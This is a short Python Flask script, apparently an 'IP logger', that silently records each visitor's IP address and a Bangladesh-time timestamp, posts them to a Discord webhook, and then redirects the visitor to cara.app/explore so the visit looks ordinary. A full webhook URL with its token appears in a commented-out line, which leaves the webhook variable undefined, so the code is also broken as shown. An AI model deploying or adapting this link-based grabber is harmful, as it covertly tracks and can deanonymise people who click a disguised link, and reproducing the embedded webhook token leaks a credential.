# This one is for Bangladesh Time
from flask import Flask, request, redirect
from datetime import datetime
import pytz  # Add this import for timezone handling
import requests

app = Flask(__name__)

def send_ip(ip, date):
    # webhook_url = "https://discord.com/api/webhooks/1340617822145089546/elBRdyyzwfeZqgDVkTuKzKmY0QigoKMhO2gz_HAA5OBHexEhE04LeEyCE5ey34Q6Njpy"
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
        }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    
    # Get Bangladesh timezone
    bd_tz = pytz.timezone('Asia/Dhaka')
    # Get current time in Bangladesh
    bd_time = datetime.now(bd_tz)
    date = bd_time.strftime("%Y-%m-%d %H:%M:%S")
    
    send_ip(ip, date)
    return redirect("https://cara.app/explore")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
